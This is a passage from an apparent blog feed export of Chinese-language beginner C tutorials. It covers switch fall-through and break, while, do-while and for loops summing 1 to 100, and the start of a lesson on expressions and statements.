class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (score) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;开始游戏&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;查看排名&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;设置&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如图:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927012301497.png" alt="image-20230927012301497" style="zoom: 33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927012319882.png" alt="image-20230927012319882" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927012332979.png" alt="image-20230927012332979" style="zoom:33%;" /><p>显然,我们发现输出完对应的语句后并没有停止,而是向下一直运行—因为一直没有遇到<code>break;语句</code>.读者可以自行尝试在中间适当位置加上<code>break;</code>来测试是否会在此处停止.</p><p>另外,我们测试一下default的位置:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (score) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;开始游戏&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;查看排名&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 要记得加上`break;`!</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;设置&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927012606490.png" alt="image-20230927012606490" style="zoom:33%;" /><p>可以发现并没有任何的影响.但是要注意因为default不在末尾了,要记得加上<code>break;</code>!</p><p>最后,我们可以利用一下switch没遇到<code>break;</code>就不会停止(到达尾部除外)的特性,写一个程序:</p><h3 id="及格判断">及格判断</h3><p>输入’A’,‘B’,‘C’,'D’这4个评级之一,判断是否及格—除了’D’都及格.同时,要判断错误输入.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> level;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;level); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (level) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;恭喜你,及格了!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;很遗憾,不及格!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码中可以看出,无论是匹配到’A’,‘B’,'C’中的任何一个,都会执行10,11两行—因为前面的标签后面没有任何语句!包括<code>break;</code>也没有!所以一直向下到第10行,这样一定程度上简化了代码—但是绝对不能滥用,因为毕竟这是C语言的一个特性,要慎重!</p><p>运行结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927013445783.png" alt="image-20230927013445783" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927013502980.png" alt="image-20230927013502980" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927013514457.png" alt="image-20230927013514457" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230927013526700.png" alt="image-20230927013526700" style="zoom:33%;" /><br><p>至此,选择执行的语句基本介绍完毕,但是有些细节—例如<code>break;</code>语句究竟是什么?等问题,还有嵌套使用等都要在后面进行详细的讲解.</p><p>​—WAHAHA 2023.9.27</p><br><br><p>上一篇:<a href="../2023-09-22-22bfbdadd502">C语言教程-5-顺序执行</a></p><p>下一篇:<a href="../2023-09-24-6c790fce4667">C语言教程-7-循环执行</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-7-循环执行</title>
      <link href="/2023-09-24-6c790fce4667/"/>
      <url>/2023-09-24-6c790fce4667/</url>
      
        <content type="html"><![CDATA[<p>我们已经有了最基本的程序的编写能力,即根据我们的思路一行一行的编写或者进行一些条件判断,这当然没有问题,我们已经能够运用他们解决许多问题,但是仍有一些问题无法处理,需要学习第三种流程控制—<code>循环</code>.</p><h1 id="什么是循环执行">什么是循环执行</h1><p>为了讲解循环,我们引入一个问题:<code>我要计算从1+2+3+4+...+100的值</code>为了说明问题,我们要求不允许使用简便方法(即高斯的做法),而仅仅只能一个个的累加起来,并编写一个程序,当然,我们可以一行一行的慢慢编写相加,这样可以,代码大概是类似这样子的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">sum = sum + <span class="number">1</span>; <span class="comment">// 这里的=是赋值,并不是数学意义上的=,也就是说是要把右面的值赋值给左面,</span></span><br><span class="line"><span class="comment">// sum一开始是0,这里先把sum在赋值前的值0加上1,把运算结果1重新赋值给sum,最后sum变成1</span></span><br><span class="line">sum = sum + <span class="number">2</span>;</span><br><span class="line">sum = sum + <span class="number">3</span>;</span><br><span class="line">sum = sum + <span class="number">4</span>;</span><br><span class="line">sum = sum + <span class="number">5</span>;</span><br><span class="line">sum = sum + <span class="number">6</span>;</span><br><span class="line"><span class="comment">//...以此类推</span></span><br><span class="line">sum = sum + <span class="number">99</span>;</span><br><span class="line">sum = sum + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序没有问题,但是可以看出来,代码量很大,从1加到100的运算就需要100行,笔者甚至都做了省略.</p><p>但是我们可以发现,每一步操作都是相似的—我们让sum加上一个特定的值,并且这个值是递增的.</p><p>那么,我们就有机会对其进行简化—既然每次增加的值都是递增的,而且所有的操作都是加法,我们可不可以写一个变量i,让他从1循环到100,然后让sum=sum+i;依次执行100次来达到相同的结果呢?</p><p>当然是可以的,循环控制就是为了解决这种类似的问题.</p><p>C语言有3种循环语句的实现,分别是while,do…while,for循环.下面依次进行讲解.</p><p>​</p><h1 id="while循环语句">while循环语句</h1><p>while循环语句是最简单的一种循环语句,他只有一个条件判断进行控制:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(表达式)&#123;</span><br><span class="line"><span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后续其他语句</span></span><br></pre></td></tr></table></figure><p>while循环就这么简单,其中,<code>表达式</code>是任何合法的表达式,但是从逻辑上,他应该是逻辑表达式(包含逻辑运算符的表达式),实际上,这个表达式应该叫做<code>循环条件</code>,后面我们也将其称为<code>循环条件</code></p><p>下面来解释while循环的执行过程:</p><p>1.对<code>表达式</code>进行求值,并判断其是否为<code>真</code>,如果是<code>真</code>那么就继续<code>第2步</code>;否则跳转到<code>第4步</code></p><p>2.依次执行循环体中的语句,也就是花括号括起来的这个复合语句</p><p>3.执行完毕后,跳转到<code>第1步</code></p><p>4.忽略/结束该循环,继续向下执行后续其他语句</p><p>画成流程图是这样的:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924190520596.png" alt="image-20230924190520596" style="zoom:33%;" /></p><p>总结就是,每次循环开始前都要对指定的表达式进行一个求值判断,如果为<code>真</code>则进入循环,执行完毕后再次进行判断,直到某一次判断的结果为<code>假</code>才跳出循环.</p><p>那么这就意味着,循环的执行过程中必须能保证达到某个程度时<code>表达式</code>求值为假或直接跳出循环.</p><p>一般情况下,我们使用一个变量进行循环控制,例如每次这个变量自增1,直到该变量超出一个范围,则跳出循环.</p><p>综上,我们尝试编写<code>计算从1+2+3+4+...+100的值</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">1</span>, sum = <span class="number">0</span>; <span class="comment">// i就是那个用于循环控制的变量,同时,其值也可以加以利用</span></span><br><span class="line"><span class="keyword">while</span> (i &lt;= <span class="number">100</span>) &#123; <span class="comment">// i小于等于100时一直进行,直到i增加到101则退出循环</span></span><br><span class="line">sum = sum + i;</span><br><span class="line">i = i + <span class="number">1</span>; <span class="comment">// 循环变量进行自增</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924191251084.png" alt="image-20230924191251084" style="zoom:33%;" /><p>显然,代码的关键部分就是<code>i&lt;=100</code>和<code>i=i+1</code>这两个,同时,i必须在进入循环前就初始化,因为第一次循环就要进行判断.</p><h1 id="do-while循环语句">do…while循环语句</h1><p>do…while()语句和while语句只有一个唯一的一个区别,那就是:<code>第一次循环是无条件执行的</code></p><p>换句话说,无论如何,<code>do...while()语句</code>控制的循环体至少会执行一次,而<code>while()语句</code>控制的循环体可能一次都不会执行—如果第一次条件判断就为假的话.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="comment">//循环体</span></span><br><span class="line">&#125;<span class="keyword">while</span>(循环条件); <span class="comment">// 注意最后的;一定不能省略!</span></span><br></pre></td></tr></table></figure><p>如前所述,循环条件就是一个表达式.</p><p>do…while()语句的执行过程和while基本完全一样,唯一的区别就是在第一次循环不会进行条件判断:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924200151214.png" alt="image-20230924200151214" style="zoom:33%;" /></p><p>除了第一次循环,往后的每一次循环前都要进行一次判断.</p><p>我们利用do…while()进行改写求和程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">1</span>, sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">i = i + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (i &lt;= <span class="number">100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读者可以自行运行一下,或尝试自行编写一遍.</p><h1 id="for循环语句">for循环语句</h1><p><code>for()语句</code>是C语言中最难,也最强大的循环语句,所有的<code>while()语句</code>,<code>do...while()语句</code>都可以轻易地修改为<code>for语句</code>,反过来,<code>for()循环语句</code>并不一定能轻易地修改为其他两种语句的写法.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(表达式<span class="number">1</span>;表达式<span class="number">2</span>;表达式<span class="number">3</span>)&#123;</span><br><span class="line"><span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>for()语句</code>的执行顺序如下:</p><p>1.对<code>表达式1</code>求值,一般是循环变量的声明和初始化</p><p>2.对<code>表达式2</code>进行判断,一般是对循环变量的值进行判断,也就是说<code>表达式2</code>相当于while()中的循环条件,如果是<code>真</code>那么就继续<code>第3步</code>;否则跳转到<code>第5步</code></p><p>3.正常执行循环体</p><p>4.对<code>表达式3</code>进行求值,一般是循环变量的自增或自减,然后跳转到<code>第2步</code></p><p>5.忽略/结束该循环,继续向下执行后续其他语句</p><p>流程图如下:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924201703987.png" alt="image-20230924201703987" style="zoom:33%;" /></p><p>实际上,表达式1会在第一次循环开始前(可能一次都不会执行)执行且仅执行一次,无论循环是否执行.</p><p>然后,接下来就是正常的条件判断,进而选择是否执行循环体.</p><p>当一次循环结束后,表达式3会被执行一次,然后才进行下一次条件判断.</p><p>如此反复,直到循环终止.</p><p>此外,这3个表达式都是可以省略的,甚至可以全部省略,但是两个<code>;</code>绝对不能省略,否则报错.</p><p>利用这个特性,还有while(1)等写法,我们可以写出死循环(并不是真的死循环,还是有终止条件的),但是关于这里的知识,我们会在<code>跳转执行</code>部分进行讲解.</p><p>同样,我们修改程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此,基本的讲解结束,另外,关于本章的求和程序还有一些其他写法,帮助各位深刻理解3种循环语句.</p><h1 id="1到100求和的其他写法">1到100求和的其他写法</h1><h2 id="第一个">第一个</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>;) &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">i = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第二个">第二个</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>, i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (; i &lt;= <span class="number">100</span>;) &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">i = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第三个">第三个</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>, i;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (( i = i + <span class="number">1</span> ) &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​—WAHAHA,2023.9.24</p><br><br><p>上一篇:<a href="../2023-09-24-7a3f77e5bcf7/">c语言教程-6-选择执行</a></p><p>下一篇:<a href="../2023-09-27-0671b7d09817">c语言教程-8-跳转控制和嵌套</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-4-表达式和语句</title>
      <link href="/2023-09-23-7bb78790d38b/"/>
      <url>/2023-09-23-7bb78790d38b/</url>
      
        <content type="html"><![CDATA[<p>我们前面已经学习了C语言最基本的数据存储,学习了如何使用<code>变量</code>和<code>常量</code>.</p><p>为了后面的知识:三种流程控制等,我们有必要现在就引入表达式和语句的概念.</p><p>这里简单甚至可能不准确的概括一下主要信息:</p><p>表达式由<code>运算</code>构成,<code>常见情况下</code>,如果在一个表达式后面添加一个<code>分号;</code>,则他成为一条语句.</p><h1 id="表达式">表达式</h1><h2 id="什么是表达式">什么是表达式</h2><p>cppreference标准定义为:<code>表达式是运算符及其操作数的序列，它指定一个运算.</code></p><p>所谓运算符,就是类似<code>+-*/</code>这样的符号,他可能有多个字符组成,C语言中有许多运算符,用于实现各种运算.</p><p>所谓操作数,就是运算符的运算对象,例如<code>1+2</code>中的<code>1</code>和<code>2</code>即为<code>+</code>的操作数.</p><p>C中的大部分语句都是表达式语句(见后面讲解<code>语句</code>的部分),所以<code>表达式</code>是C语言不可或缺的组成部分.大到一个函数调用,小到一个常量,都可以称为表达式,想要理解表达式,就要知道表达式有哪些.</p><p>实际上,我们之前见过的各种赋值,四则运算的操作,都属于表达式!</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923162451089.png" alt=""></p><h2 id="表达式有哪些">表达式有哪些</h2><h3 id="初等表达式">初等表达式</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923161056185.png" alt="image-20230923161056185"></p><p>上图为C标准的描述,实际上已经比较清楚(真的假的???)</p><p>那么说人话就是,你平时见到的数字,字符,或者各种单个的标识符(例如变量n,函数名printf),都是初等表达式.</p><p>这&quot;人话&quot;说的可能还有点不清楚,举几个例子就好:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">3</span>,b=<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">12</span></span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure><p>3~8行这些都是合法的初等表达式</p><p>另一方面,例如在<code>1+2*3</code>中,<code>2*3</code>作为其子表达式,<code>1</code>作为初等表达式,也是其子表达式,更近一步,<code>2*3</code>中,<code>2</code>和<code>3</code>都是初等表达式</p><h3 id="不求值表达式">不求值表达式</h3><p>sizeof运算符的操作数是不求值表达式（除非它们是 VLA — 我们不必理会）.sizeof运算符用于查询对象或类型的大小.</p><p>更新的标准C11中新增的内容有:<a href="https://zh.cppreference.com/w/c/language/_Alignof"><code>_Alignof</code> 运算符</a>的操作数、<a href="https://zh.cppreference.com/w/c/language/generic">泛型选择</a>的控制表达式及作为 <code>_Alignof</code> 的操作数的 VLA 的大小表达式亦为不求值的表达式.</p><p>其实很显然,这些由初等表达式和各种运算符组合起来的序列都是表达式,标准称:它指定一个运算(我们再把图放一遍)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923162451089.png" alt="image-20230923162451089"></p><p>不仅仅是用于计算算术运算的序列是表达式,其他的特殊运算(例如复合赋值,逻辑运算,关系运算,成员访问,函数调用)都能组成表达式.</p><p>换句话说,我们说<code>学习C语言的大部分过程实际上就是学习如何正确编写合适的表达式用于计算</code>也不为过.</p><p>此外关于这些其他运算和运算符等的知识,将在后面进行讲解.</p><p>​—WAHAHA,2023.9.23</p><h1 id="语句">语句</h1><h2 id="什么是语句">什么是语句</h2><p>以下根据<code>cppreference</code>的相关定义进行讲解.</p><p>c语言中,程序的基本单位是函数,而在每一个函数中(或者说一个过程),每一步运行的都是语句.</p><p>换句话说,<code>语句是按顺序执行的 C 程序段。任何函数体都是一条复合语句，继而为语句或声明的序列</code>,例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123; <span class="comment">// 复合语句的开始</span></span><br><span class="line">    <span class="type">int</span> n = <span class="number">1</span>; <span class="comment">// 声明（非语句）</span></span><br><span class="line">    n = n+<span class="number">1</span>; <span class="comment">// 表达式语句</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n = %d\n&quot;</span>, n); <span class="comment">// 表达式语句</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回语句</span></span><br><span class="line">&#125; <span class="comment">// 复合语句之结尾，函数体之结尾</span></span><br></pre></td></tr></table></figure><h2 id="语句的分类">语句的分类</h2><p>首先必须要说明的一点是,下面的概念是相对严谨的描述(我根据cppreference进行描述),如果不理解不要紧,后面会进行穿插讲解,其实重要一点的就是要知道什么地方需要加<code>;</code>什么地方不需要加.</p><p>语句有五种类型：</p><ol><li><p>复合语句</p><p>或称块语句,由一对{}括起来,是花括号所包围的语句与声明的序列.</p><p>复合语句允许将一组声明和语句组合入一个单元，并将其在任何期待单个语句的场所使用(例如在 <a href="https://zh.cppreference.com/w/c/language/if">if</a> 